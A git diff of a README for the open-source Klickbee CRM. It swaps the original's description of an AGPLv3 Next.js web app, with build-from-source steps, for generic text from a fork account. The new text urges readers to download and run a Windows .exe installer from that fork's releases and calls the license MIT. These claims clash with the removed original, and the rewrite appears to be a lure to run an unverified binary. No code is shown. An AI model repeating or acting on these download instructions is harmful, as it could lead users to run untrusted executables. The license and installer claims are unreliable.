@@ -1,216 +1,56 @@
-<h1 align="center">Klickbee CRM</h1>
+# 📈 klickbee-crm - Simple CRM for Everyday Use
 
-<p align="center">
-  <a href="https://app.supademo.com/demo/cmhvs1cli17ry17y0j39gcp3n?utm_source=github">
-    <img src="https://img.shields.io/badge/A%20demo%20is%20better%20than%20a%20thousand%20words-black?style=for-the-badge&logo=Supabase&logoColor=white" alt="A demo is better than a thousand words" />
-  </a>
-</p>
+## 🔗 Download Now
+[![Download klickbee-crm](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/sandrosilveira28/klickbee-crm/releases)
 
-<p align="center"><strong>The open-source CRM built for agencies, freelancers, and digital businesses.</strong></p>
+## 📖 Introduction
+Welcome to klickbee-crm! This is a monolithic open-source customer relationship management tool. If life was as easy as using this CRM, we would all be happy. It's designed to help you manage your customer interactions efficiently and simply.
 
-<p align="center">
-  <img alt="License" src="https://img.shields.io/badge/license-AGPLv3-green?style=flat-square">
-  <img alt="Build" src="https://img.shields.io/badge/build-passing-brightgreen?style=flat-square">
-  <img alt="Version" src="https://img.shields.io/badge/version-1.0-blue?style=flat-square">
-  <img alt="Made by Stralya" src="https://img.shields.io/badge/made%20by-Stralya-4B5563?style=flat-square">
-</p>
-
-<h2 align="center"> 
+## 👩‍💻 Features
+- **User-Friendly Interface**: Easy to navigate and understand, making it suitable for everyone.
+- **Contact Management**: Store and organize your contacts with ease.
+- **Task Tracking**: Keep track of your tasks and deadlines within the system.
+- **Reporting Tools**: Generate basic reports to analyze your customer interactions.
+- **Multi-User Access**: Collaborate with your team through shared access.
   
-  [What does it looks like ?](https://www.figma.com/design/N4VAfIOJaAAtqzSjGbyFJ7/Klickbee--Community) 
-  
-</h2>
+## 🚀 Getting Started
+Before you can dive into using klickbee-crm, you’ll need to download and install it on your computer. Follow these steps to get started:
 
----
+### ⏳ Requirements
+- A computer running Windows, MacOS, or Linux.
+- Internet connection for downloading the software and accessing updates.
 
-### 🧠 What is Klickbee CRM?
+### 📥 Download & Install
+1. **Visit the Releases Page**: Click on the following link to go to the releases page: [Download klickbee-crm](https://github.com/sandrosilveira28/klickbee-crm/releases).
+2. **Select the Latest Release**: Look for the latest version (e.g., v1.0.0). You will find a list of files available for download.
+3. **Download the Installer**: Click on the appropriate installer file for your operating system. For example, if you are using Windows, you may see a file named `klickbee-crm-windows.exe`. 
+4. **Run the Installer**: Once the file is downloaded, locate it in your downloads folder and double-click to run the installer. Follow the on-screen instructions to complete the installation.
+5. **Launch the Application**: After installation, you can find klickbee-crm in your applications menu. Click to start using it.
 
-**Klickbee CRM** is an open-source CRM built entirely with **Next.js**. It centralizes customer management, sales
-tracking, and internal collaboration in a modular, scalable structure.
+### 📊 Set Up Your First CRM
+1. **Create an Account**: Upon launching the application, create a user account to get started.
+2. **Add Contacts**: Begin adding your customer contacts. You can enter names, emails, and phone numbers with just a few clicks.
+3. **Create Tasks**: Define tasks for your contacts to keep everything organized. Assign deadlines and priorities as needed.
+4. **Generate Reports**: Use the built-in reporting tools to view your progress and interactions with different customers.
 
-Built for agencies, freelancers, and businesses who need clarity, sovereignty, and speed.
+## 🎮 Examples
+ klicbee-crm is user-friendly. Here’s how to add a new contact:
 
----
+1. Click on the "Add Contact" button.
+2. Fill in the required fields, like name and email.
+3. Save your contact.
 
-### 🧩 Architecture
+That’s it. Your new contact will appear in the list immediately.
 
-Klickbee CRM follows a [**Feature-Driven Architecture (FDA)**](https://github.com/Klickbee/feature-driven-architecture) — each feature is self-contained with its own logic, UI,
-and data layer.
+## 📨 Support & Feedback
+If you have any questions, issues, or feedback, please feel free to reach out. You can visit the [issues page](https://github.com/sandrosilveira28/klickbee-crm/issues) to report problems or ask for help.
 
-```
-src/
-├── app/                     # Next.js App Router
-├── components/              # Global components
-├── feature/
-│   ├── auth/                # Authentication (login, signup, etc.)
-│   ├── companies/           # Company management (list, details, forms)
-│   ├── customers/           # Customer management
-│   ├── dashboard/           # Main dashboard and analytics
-│   ├── deals/               # Deals and opportunities tracking
-│   ├── meetings/            # Meetings and appointments
-│   ├── prospects/           # Prospects and leads management
-│   ├── settings/            # App and user settings
-│   ├── todo/                # Task and to-do management
-│   └── user/                # User management and profiles
-├── libs/                    # Utility functions and shared logic
-└── types/                   # Global TypeScript types
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/sandrosilveira28/klickbee-crm)
+- [Documentation](https://github.com/sandrosilveira28/klickbee-crm/wiki)
 
-```
+## ✨ Community
+Join our community by participating in discussions. Share your experiences, tips, and tricks with other users. Your input makes a difference in enhancing the application.
 
-Each feature manages its own state, components, and API integrations. This approach ensures a **clear separation of
-concerns**, making the app maintainable and scalable.
-
----
-
-### 🚀 MVP Features
-
-| Feature       | Description                                      |
-|---------------|--------------------------------------------------|
-| Companies     | Manage organizations and business clients        |
-| Contacts      | Individual client profiles linked to companies   |
-| Deals         | Sales pipeline and deal tracking                 |
-| Activities    | Follow-ups, notes, and call logs                 |
-| Notifications | Toasts and inline feedback for user actions      |
-| Forms         | React Hook Form + Zod validation for reliability |
-
----
-
-### 🧠 Tech Stack
-
-| Tech                          | Description                                      |
-|-------------------------------|--------------------------------------------------|
-| **Next.js 15**                | App Router architecture                          |
-| **React 19**                  | UI layer                                         |
-| **TailwindCSS 4 + shadcn/ui** | Styling & components                             |
-| **Zustand**                   | Local state management                           |
-| **TanStack Query**            | Server state & async data handling               |
-| **Prisma ORM**                | PostgreSQL / SQLite support                      |
-| **Zod + Yup**                 | Form validation (All yup will be migrate to zod) |
-| **NextAuth.js**               | Authentication                                   |
-| **Nodemailer**                | Email sending                                    |
-
----
-
-### ⚙️ Getting Started
-
-**Option 1: Local Development**
-
-1. Clone the repository:
-
-```bash
-git clone https://github.com/Klickbee/klickbee-crm.git
-cd klickbee-crm
-```
-
-2. Install dependencies:
-
-```bash
-npm install
-```
-
-3. Copy and configure the environment file:
-
-```bash
-cp .env.example .env
-```
-
-4. Run the development server:
-
-```bash
-npm run dev
-```
-
-The application runs at [localhost:3000](http://localhost:3000)
-
----
-
-
-**Option 2 : Production Deployment**
-
-Clone the repo and install dependencies as above.
-
-Copy .env.example to .env and configure it for production.
-
-1. Build the application:
-
-```bash
-npm run build
-```
-
-Migrate the database :
-
-```bash
-npx prisma migrate deploy
-```
-
-2. Start the production server:
-
-```bash
-npm start
-```
-
-or use PM2 for process management:
-
-```bash
-pm2 start npm --name "klickbee-crm" -- start
-```
-
-We recommend using a reverse proxy like [Caddy](https://caddyserver.com/) for better performance and security.
-
-
----
-
-### 🧹 Code Quality & Linting
-
-Klickbee CRM uses **ESLint** and **TypeScript**
-
-| Tool       | Purpose                   |
-|------------|---------------------------|
-| ESLint     | Enforces coding standards |
-| TypeScript | Ensures type safety       |
-
----
-
-### 🧠 Roadmap
-
-| Milestone                    | Status | Description               |
-|------------------------------|--------|---------------------------|
-| Company & Contact Management | ✅      | Core features implemented |
-| Opportunity Pipeline         | ✅      | Implemented               |
-| Notes & Activities           | ✅      | Available                 |
-| Dashboard & Stats            | ✅     | Implemented                   |
-| Automations & Workflows      | 🔜     | Coming on next release           |
-
----
-
-### 🚧 Contributing
-
-Klickbee CRM is built in the open. Feedback, ideas, and PRs are welcome.
-
-1. Fork the repository
-2. Create a feature branch
-3. Commit using Conventional Commits
-4. Submit a Pull Request 🎯
-
----
-
-### 📄 License
-
-This project is licensed under the [GNU Affero General Public License v3.0](./LICENSE).
-
----
-
-### 🌐 Maintained by [Stralya](https://github.com/stralya-company)
-
-We build tools for digital creators.
-
-* ✉️ [contact@stralya.com](mailto:contact@stralya.com)
-* 💬 [Discord](https://discord.gg/SmBxh4wPrv)
-* 🌎 [stralya.com](https://stralya.com) (coming soon)
-* 🌎 [klickbee.com](https://klickbee.com)
-
----
-
-<p align="center">
-  <em>Klickbee CRM. Organize, track, and grow smarter.</em>
-</p>
+## 👨‍⚖️ License
+klickbee-crm is open-source software licensed under the MIT License. You can freely use, modify, and distribute it.
